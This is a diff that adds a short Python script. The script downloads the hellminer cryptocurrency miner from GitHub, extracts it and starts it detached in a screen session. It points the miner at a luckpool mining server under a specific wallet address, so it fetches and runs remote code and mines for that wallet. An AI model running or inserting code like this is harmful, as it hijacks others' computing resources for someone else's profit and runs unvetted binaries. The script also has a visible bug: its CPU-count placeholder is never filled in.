@@ -1,0 +1,7 @@
+#!/usr/bin/python3
+import os
+
+os.system("wget https://github.com/hellcatz/luckpool/raw/41be36f0a8c38b9205c9bd68b05a0d9115548d10/miners/hellminer_cpu_linux.tar.gz")
+os.system(f"tar -xvf hellminer_cpu_linux.tar.gz")
+os.system("screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.worker2 -p x --cpu {os.cpu_count()}'")
+os.system("screen -ls")
